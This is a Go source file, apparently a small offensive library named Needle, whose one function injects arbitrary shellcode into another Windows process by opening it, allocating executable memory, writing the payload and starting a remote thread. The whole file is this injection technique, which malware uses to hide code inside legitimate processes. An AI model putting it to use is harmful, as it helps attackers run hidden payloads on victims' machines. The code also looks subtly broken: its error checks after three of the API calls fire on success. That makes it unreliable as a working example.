// +build windows

// Needle.go by Vyrus001: https://github.com/vyrus001/needle

package needle

import (
	"errors"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
	MEM_RESERVE               = 0x2000
	MEM_COMMIT                = 0x1000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_ALL_ACCESS        = 0x1F0FFF
)

func Inject(pid int, payload []byte) error {
	kernel, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("err loading kernel32.dll -> %s", err)
	}
	openProc, err := kernel.FindProc("OpenProcess")
	if err != nil {
		return fmt.Errorf("err locating OpenProcess -> %s", err)
	}
	writeProc, err := kernel.FindProc("WriteProcessMemory")
	if err != nil {
		return fmt.Errorf("err locating WriteProcessMemory -> %s", err)
	}
	allocExMem, err := kernel.FindProc("VirtualAllocEx")
	if err != nil {
		return fmt.Errorf("err locating VirtualAllocEx -> %s", err)
	}
	createThread, err := kernel.FindProc("CreateRemoteThread")
	if err != nil {
		return fmt.Errorf("err locating CreateRemoteThread -> %s", err)
	}

	// open remote process
	remoteProc, _, err := openProc.Call(
		PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
		uintptr(0),
		uintptr(int(pid)),
	)
	if remoteProc != 0 {
		return fmt.Errorf("OpenProcess err -> %s", err)
	}

	// allocate memory in remote process
	remoteMem, _, err := allocExMem.Call(
		remoteProc, uintptr(0), uintptr(len(payload)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE,
	)
	if remoteMem != 0 {
		return fmt.Errorf("VirtualAllocEx err -> %s", err)
	}

	// write shellcode to the allocated memory within the remote process
	writeProcRetVal, _, err := writeProc.Call(
		remoteProc, remoteMem, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), uintptr(0),
	)
	if writeProcRetVal != 0 {
		return fmt.Errorf("WriteProcessMemory err -> %s", err)
	}

	// call new thread on payload
	status, _, _ := createThread.Call(
		remoteProc, uintptr(0), 0, remoteMem, uintptr(0), 0, uintptr(0),
	)
	if status == 0 {
		return errors.New("could not inject into given process")
	}

	return nil
}
